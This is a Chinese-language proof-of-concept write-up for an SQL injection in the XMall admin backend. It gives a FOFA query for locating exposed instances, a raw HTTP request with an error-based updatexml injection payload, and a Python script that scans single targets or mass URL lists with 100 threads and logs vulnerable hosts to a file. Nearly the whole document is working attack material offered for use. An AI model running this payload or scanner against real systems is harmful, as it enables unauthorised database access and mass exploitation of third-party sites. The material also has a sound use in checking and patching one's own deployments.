### fofa

```markdown
app="XMall-后台管理系统"
```

### payload

```markdown
GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136 HTTP/1.1
```

![image-20240913085256098](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240913085256098.png)

### 命令

```markdown
python3 脚本文件名 -u url			# 单个检测
python3 脚本文件名 -f url.txt		# 批量检测
```

### poc

```python
import argparse, sys, re, requests
from multiprocessing.dummy import Pool
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()

# 打印程序欢迎界面
def banner():
    test = """
   
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-13
                                                    version: 1.0
                                                    author: hulless-oat
    """
    print(test)

# 主函数
def main():
    banner() # 打印欢迎界面
    parser = argparse.ArgumentParser(description="Exrick XMall SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100) # 创建一个线程池，最大线程数为100
        mp.map(poc,url_list) # 映射poc函数到url列表，并行执行
        mp.close() # 关闭线程池
        mp.join() # 等待所有线程执行完毕
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

# 漏洞检测函数
def poc(target):
    # 构造payload的url
    payload = '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    url = target + payload
    headers = {
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
    }

    try:
        res = requests.get(url=url,headers=headers,timeout=5)
        # print(res.text)
        # 使用正则表达式匹配XPATH语法错误信息
        match = re.search(r'XPATH syntax error: ([^\n]*)',res.text)
        if match:
            print(f"[+]{GREEN}该网站存在SQL注入漏洞: {target}\n{RESET}")
            with open("result.txt","a",encoding="utf-8") as f:
                f.write(target+'\n')
        else:
            print(f"[-]该网站不存在SQL注入漏洞")
    except Exception as e:
        print(f"[*]该网站无法访问")

# 程序入口
if __name__ == '__main__':
    main()
```

